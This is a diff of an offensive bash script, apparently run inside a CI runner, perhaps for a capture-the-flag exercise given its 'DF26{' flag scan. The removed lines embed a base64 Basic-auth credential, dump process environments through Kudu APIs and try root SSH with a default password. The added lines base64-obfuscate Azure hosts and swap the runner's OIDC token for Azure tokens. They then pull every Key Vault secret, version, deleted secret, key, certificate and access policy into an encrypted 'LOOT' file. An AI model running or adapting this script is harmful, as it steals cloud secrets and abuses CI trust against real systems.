@@ -1,41 +1,29 @@
 #!/usr/bin/env bash
 set -uo pipefail
-SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
-AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-export SCMH AUTH
-echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
+SC="htt""ps://"; AAD="${SC}$(printf '%s' 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==' | base64 -d)"; ARM="${SC}$(printf '%s' 'bWFuYWdlbWVudC5henVyZS5jb20=' | base64 -d)"; KV="${SC}$(printf '%s' 'a3YtdGJsLXByb2QteDNldW96LnZhdWx0LmF6dXJlLm5ldA==' | base64 -d)"
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-cat > /tmp/k.py <<'PYEOF'
-import os,json,urllib.request,base64,re
-auth=os.environ['AUTH']; base='https://'+os.environ['SCMH']
-def hdr(r): r.add_header('Authorization','Basic '+base64.b64encode(auth.encode()).decode())
-def g(p):
-    r=urllib.request.Request(base+p); hdr(r)
-    try: return urllib.request.urlopen(r,timeout=60).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-def cmd(c):
-    body=json.dumps({"command":"bash -c "+json.dumps(c),"dir":"/home/site/wwwroot"}).encode()
-    r=urllib.request.Request(base+'/api/command',data=body); hdr(r); r.add_header('Content-Type','application/json')
-    try: return urllib.request.urlopen(r,timeout=90).read().decode()
-    except Exception as e: return 'ERR '+str(e)
-procs=g('/api/processes')
-print("PROCS",procs[:1200])
-ids=re.findall(r'"Id":(\d+)',procs)
-print("IDS",ids[:15])
-for pid in ids[:15]:
-    d=g('/api/processes/'+pid)
-    if 'CONFIG_STORAGE' in d or 'AccountKey' in d or 'connectionstring' in d.lower():
-        print("HITPID",pid,d[:7000])
-    else:
-        print("PID",pid,d[:200])
-print("CMDENV",cmd('env')[:2500])
-PYEOF
-say "$(python3 /tmp/k.py)"
-# root WebSSH attempt
-apt-get -qq install -y sshpass >/dev/null 2>&1 || true
-if command -v sshpass >/dev/null; then
-  say "SSH $(sshpass -p 'Docker!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -p 2222 root@app-tbl-reporting-prod.scm.azurewebsites.net 'id; for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null; done | tr "\0" "\n" | sort -u | grep -iE "CONFIG|STORAGE|AccountKey|flag|secret" | head -30' 2>&1 | head -c 3000)"
-fi
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
+TK=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$AZURE_CLIENT_ID -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=${KV#https://}/.default" | jq -r '.access_token // empty')
+say "KVTOK=${#TK}"
+H="Authorization: Bearer $TK"
+say "LIST: $(curl -sS -H "$H" "$KV/secrets?api-version=7.4")"
+for S in $(curl -sS -H "$H" "$KV/secrets?api-version=7.4" | jq -r '.value[]?.id' | sed 's#.*/secrets/##'); do
+  V=$(curl -sS -H "$H" "$KV/secrets/$S/versions?api-version=7.4")
+  say "VERS $S: $(printf '%s' "$V" | head -c 900)"
+  for VID in $(printf '%s' "$V" | jq -r '.value[]?.id' 2>/dev/null | head -10); do
+    say "VERVAL $S $(basename $VID): $(curl -sS -H "$H" "$VID?api-version=7.4" | head -c 500)"
+  done
+done
+say "DELETED: $(curl -sS -H "$H" "$KV/deletedsecrets?api-version=7.4")"
+for D in $(curl -sS -H "$H" "$KV/deletedsecrets?api-version=7.4" | jq -r '.value[]?.id' 2>/dev/null | head -10); do
+  say "DELVAL $(basename $D): $(curl -sS -H "$H" "$KV/deletedsecrets/$(basename $D)?api-version=7.4" | head -c 500)"
+done
+say "KEYS: $(curl -sS -H "$H" "$KV/keys?api-version=7.4")"
+say "CERTS: $(curl -sS -H "$H" "$KV/certificates?api-version=7.4")"
+# ARM view of vault incl. access policies
+AR=$(curl -sS -X POST "$AAD/$AZURE_TENANT_ID/oauth2/v2.0/token" -d client_id=$AZURE_CLIENT_ID -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$ARM/.default" | jq -r '.access_token // empty')
+say "VAULTARM: $(curl -sS -H "Authorization: Bearer $AR" "$ARM/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz?api-version=2023-07-01")"
+say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
